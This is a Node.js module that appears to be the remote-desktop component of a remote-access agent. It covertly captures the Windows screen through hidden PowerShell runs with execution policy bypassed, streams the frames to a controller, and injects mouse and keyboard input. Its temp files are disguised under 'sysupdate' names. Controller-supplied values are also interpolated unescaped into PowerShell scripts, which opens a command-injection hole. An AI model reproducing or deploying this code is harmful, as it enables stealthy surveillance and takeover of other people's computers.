const { spawn } = require('child_process');
const path = require('path');
const fs = require('fs');
const log = require('./logger');

class Remote {
  constructor(agent) {
    this.agent = agent;
    this.streaming = false;
    this.captureProcess = null;
    this.fps = 5;
    this.quality = 50;

    agent.on('shell-input', (data) => {
      const msg = data.toString();
      if (msg === '__REMOTE_START__') this.start();
      else if (msg === '__REMOTE_STOP__') this.stop();
      else if (msg.startsWith('__INPUT__')) this.handleInput(msg.replace('__INPUT__', ''));
    });

    agent.on('disconnected', () => this.stop());
  }

  start() {
    if (this.streaming) return;
    this.streaming = true;
    log.info('Remote desktop started');
    this._captureLoop();
  }

  stop() {
    this.streaming = false;
    if (this.captureProcess) {
      this.captureProcess.kill();
      this.captureProcess = null;
    }
    log.info('Remote desktop stopped');
  }

  _captureLoop() {
    if (!this.streaming) return;

    const scriptPath = path.join(process.env.TEMP || 'C:\\Temp', 'sysupdate-capture.ps1');
    const outPath = path.join(process.env.TEMP || 'C:\\Temp', 'sysupdate-frame.jpg');

    const ps = `
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
$gfx = [System.Drawing.Graphics]::FromImage($bmp)
$gfx.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
$encoder = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
$params = New-Object System.Drawing.Imaging.EncoderParameters(1)
$params.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, ${this.quality})
$bmp.Save('${outPath.replace(/\\/g, '\\\\')}', $encoder, $params)
$gfx.Dispose()
$bmp.Dispose()
`;
    fs.writeFileSync(scriptPath, ps);

    this.captureProcess = spawn('powershell.exe', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', scriptPath], {
      windowsHide: true
    });

    this.captureProcess.on('exit', () => {
      if (!this.streaming) return;
      try {
        const frame = fs.readFileSync(outPath);
        this.agent.send(frame);
      } catch {}
      // Schedule next frame
      setTimeout(() => this._captureLoop(), 1000 / this.fps);
    });
  }

  handleInput(json) {
    try {
      const event = JSON.parse(json);
      
      if (event.type === 'settings') {
        if (event.quality) this.quality = event.quality;
        if (event.fps) this.fps = event.fps;
        return;
      }

      if (event.type === 'ctrl-alt-del') {
        spawn('powershell.exe', ['-NoProfile', '-Command', 'Start-Process taskmgr'], { windowsHide: true });
        return;
      }

      const scriptPath = path.join(process.env.TEMP || 'C:\\Temp', 'sysupdate-input.ps1');
      let ps = '';

      if (event.type === 'mousemove') {
        ps = `Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(${event.x}, ${event.y})`;
      } else if (event.type === 'mousedown') {
        ps = `
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Mouse {
    [DllImport("user32.dll")] public static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);
    public static void Click(int x, int y) {
        System.Windows.Forms.Cursor.Position = new System.Drawing.Point(x, y);
        mouse_event(${event.button === 2 ? '0x0008' : '0x0002'}, 0, 0, 0, 0);
        mouse_event(${event.button === 2 ? '0x0010' : '0x0004'}, 0, 0, 0, 0);
    }
}
"@ -ReferencedAssemblies System.Windows.Forms
[Mouse]::Click(${event.x}, ${event.y})`;
      } else if (event.type === 'keydown') {
        const key = this._mapKey(event.key);
        if (key) {
          ps = `Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('${key}')`;
        }
      }

      if (ps) {
        fs.writeFileSync(scriptPath, ps);
        spawn('powershell.exe', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', scriptPath], {
          windowsHide: true
        });
      }
    } catch (e) {
      log.error(`Remote input error: ${e.message}`);
    }
  }

  _mapKey(key) {
    const map = {
      'Enter': '{ENTER}', 'Backspace': '{BACKSPACE}', 'Tab': '{TAB}',
      'Escape': '{ESC}', 'Delete': '{DELETE}', 'Home': '{HOME}',
      'End': '{END}', 'ArrowUp': '{UP}', 'ArrowDown': '{DOWN}',
      'ArrowLeft': '{LEFT}', 'ArrowRight': '{RIGHT}',
      'F1': '{F1}', 'F2': '{F2}', 'F3': '{F3}', 'F4': '{F4}',
      'F5': '{F5}', 'F6': '{F6}', 'F7': '{F7}', 'F8': '{F8}',
      'F9': '{F9}', 'F10': '{F10}', 'F11': '{F11}', 'F12': '{F12}',
    };
    if (map[key]) return map[key];
    if (key.length === 1) {
      // Escape special SendKeys chars
      if ('+^%~(){}[]'.includes(key)) return `{${key}}`;
      return key;
    }
    return null;
  }
}

module.exports = Remote;
